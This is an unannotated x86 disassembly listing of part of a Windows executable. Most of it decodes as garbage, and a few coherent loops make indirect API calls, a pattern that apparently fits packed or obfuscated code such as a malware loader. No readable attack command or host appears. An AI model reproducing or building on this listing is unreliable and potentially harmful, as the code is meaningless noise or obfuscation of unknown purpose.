  409d43:	cdq    
  409d44:	and    BYTE PTR [ecx-0x1a],dh
  409d47:	loopne 0x409d66
  409d49:	in     al,dx
  409d4a:	data16 fisttp DWORD PTR [ecx]
  409d4d:	inc    ecx
  409d4e:	xchg   ebx,eax
  409d4f:	mov    dh,0x3
  409d51:	dec    edi
  409d52:	int3   
  409d53:	dec    esi
  409d54:	push   eax
  409d55:	jne    0x409d22
  409d57:	mov    cl,bl
  409d59:	adc    edx,DWORD PTR [ebp-0x53]
  409d5c:	mov    cl,BYTE PTR [esi+0x34]
  409d5f:	repz cmp BYTE PTR [ebp+eax*4-0x1895cce4],bl
  409d67:	daa    
  409d68:	fwait
  409d69:	sbb    DWORD PTR [edx-0x5],ebp
  409d6c:	sbb    dh,BYTE PTR [ebx]
  409d6e:	jmp    0x3c06428e
  409d73:	xor    esp,esp
  409d75:	jl     0x409cfe
  409d77:	add    eax,0xc732a2cb
  409d7c:	repnz outs dx,DWORD PTR ds:[esi]
  409d7e:	les    esi,FWORD PTR [edx-0x38367a0c]
  409d84:	add    eax,0x433617
  409d89:	out    0x34,eax
  409d8b:	add    BYTE PTR [eax],al
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43360b
  409d9c:	sub    DWORD PTR ds:0x4336df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433653,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	pop    ebx
  409dbf:	pop    eax
  409dc0:	mov    ds:0x7ee2387a,al
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409d8c
  409dcb:	xchg   edx,eax
  409dcc:	mov    ecx,0x896c79b0
  409dd1:	jnp    0x409d9c
  409dd3:	iret   
  409dd4:	sbb    eax,0xb14ef593
  409dd9:	shr    DWORD PTR [ebx+esi*2-0x203d613d],cl
  409de0:	out    dx,al
  409de1:	and    DWORD PTR [esi-0x67],eax
  409de4:	pushf  
  409de5:	cmp    DWORD PTR [edi],ecx
  409de7:	push   ebx
  409de8:	add    eax,0x4f73012
  409ded:	sub    al,0x62
  409def:	cmp    al,0x7
  409df1:	push   cs
  409df2:	ret    
  409df3:	cmp    eax,0x3ee7a54e
  409df8:	das    
  409df9:	mov    ecx,0xab5c13ef
  409dfe:	mov    dh,0x82
  409e00:	gs push esi
  409e02:	into   
  409e03:	out    0xff,al
  409e05:	(bad)  
  409e06:	cdq    
  409e07:	in     al,0xad
  409e09:	dec    edi
  409e0a:	lods   al,BYTE PTR ds:[esi]
  409e0b:	or     esp,DWORD PTR [ecx]
  409e0d:	neg    ebx
  409e0f:	mov    ch,0x21
  409e11:	mov    edi,DWORD PTR [esi-0x78290a7]
  409e17:	iret   
  409e18:	push   es
  409e19:	jge    0x409df4
  409e1b:	in     al,dx
  409e1c:	xchg   esi,eax
  409e1d:	bound  esp,QWORD PTR [esi]
  409e1f:	fisttp DWORD PTR [ebx+0x545bd19d]
  409e25:	or     al,0x5c
  409e27:	adc    eax,0x62cb20a0
  409e2c:	add    DWORD PTR [ecx],esp
  409e2e:	dec    BYTE PTR [eax]
  409e30:	(bad)  
  409e31:	lahf   
  409e32:	xchg   esi,eax
  409e33:	dec    ebp
  409e34:	and    al,0x52
  409e36:	pop    ss
  409e37:	das    
  409e38:	jecxz  0x409e34
  409e3a:	adc    DWORD PTR [esi+0x6296b074],ebp
  409e40:	sub    eax,0xf1eb7df5
  409e45:	adc    ah,ah
  409e47:	iret   
  409e48:	mov    al,0xa8
  409e4a:	(bad)  
  409e4b:	fsubr  QWORD PTR [ecx-0x1526109d]
  409e51:	sub    DWORD PTR [edi+0x1d5fc3c8],esp
  409e57:	lds    ecx,FWORD PTR [ecx]
  409e59:	jecxz  0x409e28
  409e5b:	pop    ds
  409e5c:	pop    ebp
  409e5d:	jne    0x409eb3
  409e5f:	pop    edx
  409e60:	fsubr  QWORD PTR [esi-0x17]
  409e63:	cmp    eax,0xe0f9a0fb
  409e68:	mov    ds:0xb43427ec,al
  409e6d:	jle    0x409df3
  409e6f:	aas    
  409e70:	jg     0x409eb3
  409e72:	jno    0x409e52
  409e74:	or     esp,DWORD PTR [ecx-0x79]
  409e77:	test   eax,0x6c8b233e
  409e7c:	or     bh,bl
  409e7e:	or     al,0xde
  409e80:	icebp  
  409e81:	push   esp
  409e82:	pop    ebx
  409e83:	(bad)  
  409e84:	in     eax,dx
  409e85:	and    BYTE PTR [esp+esi*2-0xc],dl
  409e89:	xchg   bh,cl
  409e8b:	inc    edx
  409e8c:	es hlt 
  409e8e:	mov    ch,0xed
  409e90:	mov    DWORD PTR [ebx],esp
  409e92:	hlt    
  409e93:	mov    eax,0xe16328ec
  409e98:	push   ebx
  409e99:	gs cdq 
  409e9b:	pop    edx
  409e9c:	outs   dx,BYTE PTR ds:[esi]
  409e9d:	loop   0x409e80
  409e9f:	mov    WORD PTR [ecx+ecx*1-0x1250f81],ds
  409ea6:	and    DWORD PTR [eax+eiz*4-0x6],0xffffffbd
  409eab:	daa    
  409eac:	hlt    
  409ead:	fbstp  TBYTE PTR [esi+0x264d76a4]
  409eb3:	js     0x409e6b
  409eb5:	mov    dl,0xb4
  409eb7:	repz test DWORD PTR [edx+0x24],ecx
  409ebb:	xchg   esp,eax
  409ebc:	xchg   ecx,eax
  409ebd:	add    cl,ch
  409ebf:	lds    edi,FWORD PTR [edi+0x64e009c0]
  409ec5:	loopne 0x409e92
  409ec7:	pop    es
  409ec8:	pop    es
  409ec9:	fwait
  409eca:	jmp    0xa545:0xc99db2ca
  409ed1:	jg     0x409f50
  409ed3:	dec    esp
  409ed4:	jb     0x409eba
  409ed6:	sbb    BYTE PTR [ebp-0x11],dh
  409ed9:	daa    
  409eda:	sti    
  409edb:	mov    DWORD PTR ds:[ebp-0x4e8ddcd],ebx
  409ee2:	inc    esi
  409ee3:	pop    esp
  409ee4:	retf   
  409ee5:	scas   al,BYTE PTR es:[edi]
  409ee6:	in     al,dx
  409ee7:	inc    edi
  409ee8:	call   edi
  409eea:	sahf   
  409eeb:	sbb    BYTE PTR ds:[ebx-0x808f5e5],bl
  409ef2:	ja     0x409ea4
  409ef4:	and    ch,BYTE PTR [edi]
  409ef6:	repz cmp bl,BYTE PTR ds:0xa51a542b
  409efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409efe:	sahf   
  409eff:	rcr    DWORD PTR [ecx+0x6a],0x7b
  409f03:	and    ecx,DWORD PTR [ebx+0x34ccaf96]
  409f09:	add    esp,esi
  409f0b:	add    eax,0xf859293b
  409f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f11:	mul    dh
  409f13:	gs inc ebp
  409f15:	xchg   esp,eax
  409f16:	dec    edx
  409f17:	call   0x2f51f2e7
  409f1c:	pop    ecx
  409f1d:	or     bl,BYTE PTR [esi]
  409f1f:	xor    DWORD PTR [esi+0x41],edx
  409f22:	cmp    cl,dh
  409f24:	dec    ebp
  409f25:	xor    dl,BYTE PTR [esi-0x3c]
  409f28:	sub    al,0x40
  409f2a:	rcl    BYTE PTR [edi+0x23cfec6e],1
  409f30:	jl     0x409f58
  409f32:	jmp    0x409eba
  409f34:	pop    esp
  409f35:	sub    al,0x52
  409f37:	xchg   ebx,eax
  409f38:	mov    ecx,0xf862dc73
  409f3d:	outs   dx,DWORD PTR ds:[esi]
  409f3e:	les    esi,FWORD PTR [edx+0x74]
  409f41:	push   cs
  409f42:	cs or  eax,0xbf054e63
  409f48:	cmc    
  409f49:	jp     0x409eff
  409f4b:	inc    esp
  409f4c:	shl    BYTE PTR ds:0xe9f4e802,cl
  409f52:	retf   
  409f53:	xor    eax,DWORD PTR [edi+eiz*1+0x41]
  409f57:	hlt    
  409f58:	in     al,dx
  409f59:	jge    0x409f63
  409f5b:	ss cwde 
  409f5d:	inc    edi
  409f5e:	imul   esp,esp,0xc7abd5b5
  409f64:	or     al,0xd3
  409f66:	push   ds
  409f67:	jb     0x409f7e
  409f69:	jp     0x409fa7
  409f6b:	inc    esi
  409f6c:	mov    bl,0x31
  409f6e:	jne    0x409f9e
  409f70:	sub    DWORD PTR [edi],edx
  409f72:	add    DWORD PTR [ebp-0x4f0e15a9],ebp
  409f78:	push   ss
  409f79:	ins    BYTE PTR es:[edi],dx
  409f7a:	bound  eax,QWORD PTR [esi-0x19]
  409f7d:	mov    al,es:0x82203799
  409f83:	mov    eax,0xa2a5d68c
  409f88:	add    eax,0x20d08445
  409f8d:	fwait
  409f8e:	aas    
  409f8f:	mov    dl,0xd9
  409f91:	lods   al,BYTE PTR ds:[esi]
  409f92:	cmp    eax,0x48083f6
  409f97:	push   eax
  409f98:	mov    cl,0x2a
  409f9a:	lds    ecx,FWORD PTR [eax+0x4b60373]
  409fa0:	shr    ebp,cl
  409fa2:	xchg   edi,eax
  409fa3:	repnz mov cs,WORD PTR [ecx]
  409fa6:	xchg   ebx,eax
  409fa7:	cmp    DWORD PTR [ecx],0x33
  409faa:	out    0x31,al
  409fac:	adc    DWORD PTR [esi+edx*1],esp
  409faf:	sub    al,BYTE PTR [esi+ebx*4-0x27]
  409fb3:	(bad)  
  409fb4:	pop    ss
  409fb5:	int    0xcf
  409fb7:	ret    
  409fb8:	xchg   edx,eax
  409fb9:	fwait
  409fba:	mov    ss,WORD PTR [eax-0x21e5a33d]
  409fc0:	pushf  
  409fc1:	mov    ebx,DWORD PTR [eax-0x65]
  409fc4:	mov    esp,0x5bd31fc0
  409fc9:	push   edx
  409fca:	sbb    edx,edx
  409fcc:	xchg   ebx,eax
  409fcd:	xchg   ebp,eax
  409fce:	out    0xe3,al
  409fd0:	dec    esp
  409fd1:	loop   0x40a002
  409fd3:	adc    DWORD PTR [eax*8+0x95fb3aa],esp
  409fda:	sbb    eax,0xe9c306eb
  409fdf:	push   edx
  409fe0:	jb     0x409fac
  409fe2:	iret   
  409fe3:	xchg   ebx,eax
  409fe4:	xor    BYTE PTR [ebp+0x50c54294],cl
  409fea:	dec    esp
  409feb:	mov    ah,0xd4
  409fed:	jne    0x409f8b
  409fef:	scas   eax,DWORD PTR es:[edi]
  409ff0:	adc    eax,0x2bad5b
  409ff5:	add    BYTE PTR [ebx],dl
  409ff7:	rcl    al,0xf0
  409ffa:	jb     0x40a02b
  409ffc:	repz adc dh,bl
  409fff:	mov    DWORD PTR [edi],ecx
  40a001:	arpl   WORD PTR [eax+0x77e67406],ax
  40a007:	sub    al,0x58
  40a009:	je     0x40a083
  40a00b:	push   edx
  40a00c:	dec    ecx
  40a00d:	enter  0x225d,0xf
  40a011:	scas   eax,DWORD PTR es:[edi]
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x4336d3
  40a01e:	sbb    DWORD PTR ds:0x43360f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433663,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433623
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43365b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43365b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43365b,ecx
  40a059:	cmp    DWORD PTR ds:0x43365b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43383e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43365b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43360b,0x11
  40a090:	cmp    DWORD PTR ds:0x43360b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43360b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43360b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43360b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43360b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43360b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43360b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433603,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43366f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433613
  40a0ff:	mov    DWORD PTR ds:0x43366f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433667,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	fiadd  DWORD PTR [edx-0x3e]
  40a129:	mov    eax,DWORD PTR [edx+0x387e7ee0]
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a0d6
  40a133:	test   eax,0x53468bc7
  40a138:	adc    eax,0x777ea0b8
  40a13d:	cmp    al,0x80
  40a13f:	xor    BYTE PTR [ebp+0x281ed358],dl
  40a145:	or     BYTE PTR [ebx],bl
  40a147:	pop    es
  40a148:	aas    
  40a149:	sbb    dh,BYTE PTR [ecx-0x52]
  40a14c:	and    BYTE PTR [eax+0x32],0x72
  40a150:	sbb    BYTE PTR [edi+0x61],cl
  40a153:	jb     0x40a0e4
  40a155:	add    eax,0x932f8ebc
  40a15a:	or     BYTE PTR [eax],ah
  40a15c:	xor    al,0xe0
  40a15e:	adc    eax,0x5770d216
  40a163:	mov    edx,0xe5cd2ab8
  40a168:	push   es
  40a169:	(bad)  
  40a16a:	adc    DWORD PTR [eax-0x689376e8],edi
  40a170:	mov    dl,BYTE PTR [esp+eiz*4]
  40a173:	shl    DWORD PTR [ebx+0x1a],1
  40a176:	test   al,0xb6
  40a178:	dec    esi
  40a179:	add    dl,al
  40a17b:	add    BYTE PTR [edx-0x48e4c367],dl
  40a181:	or     BYTE PTR [ebp+0x13],cl
  40a184:	aad    0x62
  40a186:	test   eax,0x41a5c062
  40a18b:	and    eax,0x4f7c3980
  40a190:	ret    
  40a191:	adc    BYTE PTR [eax+0x6863c886],ch
  40a197:	neg    dh
  40a199:	mov    al,0xb1
  40a19b:	xchg   ecx,eax
  40a19c:	mul    DWORD PTR [eax-0x40]
  40a19f:	clc    
  40a1a0:	imul   esp,DWORD PTR [ecx+0x29da3929],0x6f62e1d1
  40a1aa:	dec    esp
  40a1ab:	xor    eax,0x79d07aec
  40a1b0:	sbb    al,0x10
  40a1b2:	mov    ds:0x905bca52,eax
  40a1b7:	xor    DWORD PTR [edi+0x15cb334b],eax
  40a1bd:	mov    DWORD PTR [eax+0x5c],edi
  40a1c0:	mov    ecx,0x63c4e2b2
  40a1c5:	adc    DWORD PTR [ebp-0x6e917615],ebx
  40a1cb:	jno    0x40a1cb
  40a1cd:	xor    al,al
  40a1cf:	xchg   ebx,eax
  40a1d0:	mov    al,0xb2
  40a1d2:	sub    al,0x16
  40a1d4:	js     0x40a199
  40a1d6:	jecxz  0x40a19d
  40a1d8:	jo     0x40a1b4
  40a1da:	add    BYTE PTR [esi-0x12],dl
  40a1dd:	popa   
  40a1de:	popf   
  40a1df:	push   edi
  40a1e0:	pop    esp
  40a1e1:	mov    ds,WORD PTR ds:0x19e8f24e
  40a1e7:	imul   ecx,DWORD PTR ds:0xdf8996c7,0xd7b3942f
  40a1f1:	jae    0x40a25e
  40a1f3:	xchg   DWORD PTR [edi+0x3],edx
  40a1f6:	jnp    0x40a1f2
  40a1f8:	int3   
  40a1f9:	sti    
  40a1fa:	mov    edx,0x519d2901
  40a1ff:	jmp    0x40a227
  40a201:	mov    cl,0x2
  40a203:	sbb    eax,0x49b0845e
  40a208:	jbe    0x40a1ce
  40a20a:	(bad)  
  40a20b:	imul   esi,DWORD PTR [eax+ecx*1-0x30dab760],0x13b605b
  40a216:	int3   
  40a217:	in     eax,dx
  40a218:	in     al,0xd9
  40a21a:	xor    edi,DWORD PTR [edi]
  40a21c:	ja     0x40a1ea
  40a21e:	into   
  40a21f:	sti    
  40a220:	mov    cl,0x1d
  40a222:	pop    es
  40a223:	inc    ebp
  40a224:	test   al,0x9f
  40a226:	xchg   ebx,eax
  40a227:	or     edi,edx
  40a229:	add    al,0x25
  40a22b:	fs sti 
  40a22d:	fs pop ecx
  40a22f:	adc    ch,ah
  40a231:	push   es
  40a232:	or     BYTE PTR [ecx-0x80],ah
  40a235:	adc    ebp,DWORD PTR [esi+edx*1]
  40a238:	and    eax,0xa58b99e8
  40a23d:	and    eax,0xa87dd68e
  40a242:	xor    esp,0x41
  40a245:	lahf   
  40a246:	inc    ebp
  40a247:	sub    DWORD PTR [eax+ebx*8+0x3c17f135],edi
  40a24e:	fdivr  DWORD PTR [eax+0x29b23b67]
  40a254:	push   ebp
  40a255:	jmp    0x40a23d
  40a257:	test   BYTE PTR [eax-0x37ff20b2],al
  40a25d:	push   ds
  40a25e:	push   0x6cca6131
  40a263:	push   0x1d
  40a265:	pop    ebx
  40a266:	std    
  40a267:	mov    BYTE PTR [edx+0x2e3f0196],bh
  40a26d:	xchg   ecx,eax
  40a26e:	inc    esp
  40a26f:	icebp  
  40a270:	xchg   ebx,eax
  40a271:	sub    BYTE PTR [ebp+0x46],dl
  40a274:	pop    eax
  40a275:	push   ebp
  40a276:	inc    eax
  40a277:	sub    al,0xf9
  40a279:	xor    ah,ch
  40a27b:	xchg   edi,eax
  40a27c:	retf   0xb400
  40a27f:	cdq    
  40a280:	sbb    DWORD PTR [ebx+0x3c28b0b5],edx
  40a286:	mov    eax,ds:0xd838d085
  40a28b:	xor    BYTE PTR [eax+0x2d2974b6],ah
  40a291:	sahf   
  40a292:	retw   
  40a294:	ds clc 
  40a296:	mov    ss,esp
  40a298:	cmp    eax,0x53c90af0
  40a29d:	sub    BYTE PTR [ecx-0x5e742872],cl
  40a2a3:	fadd   DWORD PTR [eax+0x29]
  40a2a6:	ins    DWORD PTR es:[edi],dx
  40a2a7:	jg     0x40a2f8
  40a2a9:	xor    dl,BYTE PTR [ecx]
  40a2ab:	(bad)  
  40a2ac:	retf   0xc550
  40a2af:	push   ebp
  40a2b0:	mov    bl,0xce
  40a2b2:	fst    DWORD PTR [ebp+0x19]
  40a2b5:	or     esi,DWORD PTR [edi+0x54]
  40a2b8:	pop    edi
  40a2b9:	shr    DWORD PTR [esi+0x5d4fae71],1
  40a2bf:	xor    BYTE PTR [eax+eax*4-0x30a8e2d7],bl
  40a2c6:	je     0x40a2ba
  40a2c8:	outs   dx,DWORD PTR ds:[esi]
  40a2c9:	fld    TBYTE PTR [edi+0x63b523b1]
  40a2cf:	push   es
  40a2d0:	fsub   DWORD PTR [edi]
  40a2d2:	arpl   cx,bp
  40a2d4:	jge    0x40a333
  40a2d6:	mov    esp,0xc94b0395
  40a2db:	mov    edx,ecx
  40a2dd:	pushf  
  40a2de:	(bad)  
  40a2df:	cmp    eax,0x74dc5e76
  40a2e4:	sub    al,0x57
  40a2e6:	add    al,BYTE PTR [esi-0x7ac0db94]
  40a2ec:	cwde   
  40a2ed:	sub    DWORD PTR [eax-0x41],0x2fb413b4
  40a2f4:	mov    bh,0x81
  40a2f6:	xchg   ebp,eax
  40a2f7:	or     al,0xc6
  40a2f9:	xchg   esp,eax
  40a2fa:	out    0x6f,eax
  40a2fc:	pop    es
  40a2fd:	imul   edx,DWORD PTR [esi+0x2],0xfb86af6d
  40a304:	and    ch,al
  40a306:	inc    eax
  40a307:	fmulp  st(1),st
  40a309:	fld    DWORD PTR [edi+0x221ed2b9]
  40a30f:	or     al,0x8c
  40a311:	or     ecx,edx
  40a313:	pushf  
  40a314:	in     al,dx
  40a315:	mov    cl,BYTE PTR [eax-0x4b159efb]
  40a31b:	adc    dh,al
  40a31d:	sbb    BYTE PTR [ecx+0x28],al
  40a320:	mov    edi,0x73578c0d
  40a325:	arpl   WORD PTR [ecx],si
  40a327:	mov    esp,0xf3eace8c
  40a32c:	pop    ebp
  40a32d:	push   ss
  40a32e:	push   ecx
  40a32f:	into   
  40a330:	mov    ds:0x2857cc3d,al
  40a335:	jnp    0x40a3a4
  40a337:	scas   ax,WORD PTR es:[edi]
  40a339:	ins    BYTE PTR es:[edi],dx
  40a33a:	ret    
  40a33b:	pop    ds
  40a33c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a33d:	pop    ds
  40a33e:	jge    0x40a3a2
  40a340:	inc    ebp
  40a341:	jo     0x40a35e
  40a343:	push   eax
  40a344:	enter  0x196,0xe2
  40a348:	not    BYTE PTR [ebp+0xde9d63d]
  40a34e:	inc    esp
  40a34f:	push   ds
  40a350:	cdq    
  40a351:	std    
  40a352:	(bad)  
  40a353:	repz daa 
  40a355:	fnsetpm(287 only) 
  40a357:	xchg   bh,cl
  40a359:	sub    ah,0xda
  40a35c:	inc    edx
  40a35d:	cmp    dl,BYTE PTR [ecx]
  40a35f:	retf   
  40a360:	mov    edi,0xb4890a6
  40a365:	je     0x40a2fd
  40a367:	mov    cl,0xa0
  40a369:	bound  esp,QWORD PTR [eax+0x2d5269a6]
  40a36f:	ror    al,1
  40a371:	mov    ecx,DWORD PTR [edi+0x42fb128a]
  40a377:	jb     0x40a304
  40a379:	dec    ebp
  40a37a:	call   0x25c26bb2
  40a37f:	sti    
  40a380:	xor    eax,0x43
  40a385:	add    BYTE PTR [eax],al
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4335fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4335fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4335fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4335fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4336ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43366b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433667,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433667,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433667,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433697
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433667,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433667
  40a434:	dec    eax
  40a435:	mov    ds:0x433667,eax
  40a43a:	mov    eax,ds:0x433667
  40a43f:	dec    eax
  40a440:	mov    ds:0x433667,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43361f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43372f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433723,0x4336a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433607,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	mov    ecx,0x4c6af2fc
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	ret    0xd806
  40a4aa:	or     bh,ah
  40a4ac:	jg     0x40a4b1
  40a4ae:	cwde   
  40a4af:	inc    edx
  40a4b0:	jle    0x40a4bc
  40a4b2:	sbb    edi,ebx
  40a4b4:	aas    
  40a4b5:	mov    cl,0xdc
  40a4b7:	dec    edx
  40a4b8:	call   0x80d60bae
  40a4bd:	das    
  40a4be:	adc    al,0xcf
  40a4c0:	test   al,0x1a
  40a4c2:	idiv   DWORD PTR [ebx-0x3f27e76f]
  40a4c8:	icebp  
  40a4c9:	cmp    ah,BYTE PTR [edi+esi*2]
  40a4cc:	sub    al,BYTE PTR [eax]
  40a4ce:	mov    edx,0x45b05f59
  40a4d3:	or     edi,DWORD PTR [edi+0x13]
  40a4d6:	loope  0x40a552
  40a4d8:	out    dx,eax
  40a4d9:	push   edx
  40a4da:	push   ecx
  40a4db:	xchg   esp,eax
  40a4dc:	cmovg  edi,DWORD PTR [edi+0x42]
  40a4e0:	xchg   ebp,eax
  40a4e1:	into   
  40a4e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4e3:	cwde   
  40a4e4:	(bad)  
  40a4e5:	lea    esp,[edi+edx*4-0x24c1740e]
  40a4ec:	addr16 dec esi
  40a4ee:	mov    al,0x3c
  40a4f0:	rol    DWORD PTR [esi],1
  40a4f2:	mov    bl,0xd
  40a4f4:	jnp    0x40a502
  40a4f6:	fistp  QWORD PTR [edi]
  40a4f8:	sbb    eax,0x495cd25
  40a4fd:	(bad)  
  40a4fe:	jp     0x40a520
  40a500:	mov    al,0xaf
  40a502:	mov    al,0xac
  40a504:	pop    esi
  40a505:	leave  
  40a506:	outs   dx,DWORD PTR ds:[esi]
  40a507:	pop    ebx
  40a508:	adc    DWORD PTR [ebp-0x21],edx
  40a50b:	test   DWORD PTR [ebx*8-0x3554b918],edx
  40a512:	mov    esp,DWORD PTR [ecx-0xf]
  40a515:	push   0xffffff90
  40a517:	lods   eax,DWORD PTR ds:[esi]
  40a518:	dec    eax
  40a519:	mov    esi,0x96449f14
  40a51e:	fsubp  st(1),st
  40a520:	inc    esp
  40a521:	fdivr  DWORD PTR [ecx]
  40a523:	push   0xffffffd6
  40a525:	cmc    
  40a526:	lahf   
  40a527:	sbb    ebx,DWORD PTR [edx+0x5b]
  40a52a:	sahf   
  40a52b:	xchg   edx,eax
  40a52c:	pop    ss
  40a52d:	push   0xf
  40a52f:	loop   0x40a4e9
  40a531:	(bad)  
  40a532:	pop    ebx
  40a533:	ret    
  40a534:	lods   eax,DWORD PTR ds:[esi]
  40a535:	inc    ebx
  40a536:	retf   0xfefd
  40a539:	out    0xf9,eax
  40a53b:	out    0xe4,al
  40a53d:	inc    edi
  40a53e:	push   ds
  40a53f:	cmp    esi,ebp
  40a541:	pop    edx
  40a542:	ret    0x54a7
  40a545:	lock pusha 
  40a547:	rol    BYTE PTR [ecx],1
  40a549:	fdivr  QWORD PTR [ecx]
  40a54b:	mov    al,ds:0xcb9aa4e9
  40a550:	cwde   
  40a551:	pop    edi
  40a552:	dec    ebx
  40a553:	cmp    DWORD PTR [edx+0x5da5740b],edx
  40a559:	xor    dl,BYTE PTR ds:0x8f6777e2
  40a55f:	xor    DWORD PTR ds:0x8ec8e1d7,ebx
  40a565:	xchg   edx,eax
  40a566:	push   edx
  40a567:	sub    ebx,DWORD PTR [ebp-0x4df12a8]
  40a56d:	sub    eax,0x135ea3e4
  40a572:	loopne 0x40a4ff
  40a574:	mov    ebx,0x8f2e0e16
  40a579:	adc    ebx,DWORD PTR [edi-0xf004b8d]
  40a57f:	adc    al,0x1c
  40a581:	adc    ch,BYTE PTR [ecx+edi*8]
  40a584:	adc    DWORD PTR [esi+eiz*2-0x45],esp
  40a588:	dec    ecx
  40a589:	aam    0x7d
  40a58b:	mov    bl,BYTE PTR [ebx+0x13]
  40a58e:	xor    DWORD PTR [ecx+0x7f],esp
  40a591:	sub    DWORD PTR [ebp+0x5696ed64],esi
  40a597:	cmp    si,WORD PTR [esp+ebp*8-0xb2935cc]
  40a59f:	mov    al,BYTE PTR [edx]
  40a5a1:	adc    al,0x33
  40a5a3:	ss mov dh,0x97
  40a5a6:	pop    es
  40a5a7:	sahf   
  40a5a8:	(bad)  
  40a5a9:	ja     0x40a5e2
  40a5ab:	jns    0x40a593
  40a5ad:	outs   dx,BYTE PTR ds:[esi]
  40a5ae:	and    eax,0xc8d7b53
  40a5b3:	in     al,dx
  40a5b4:	test   al,0xcf
  40a5b6:	push   ebx
  40a5b7:	call   0xcff793a9
  40a5bc:	ins    DWORD PTR es:[edi],dx
  40a5bd:	or     esp,ebx
  40a5bf:	les    ecx,FWORD PTR [esi]
  40a5c1:	add    al,0x2e
  40a5c3:	sbb    eax,0xcdf4739a
  40a5c8:	shl    DWORD PTR [esi-0x796b1181],cl
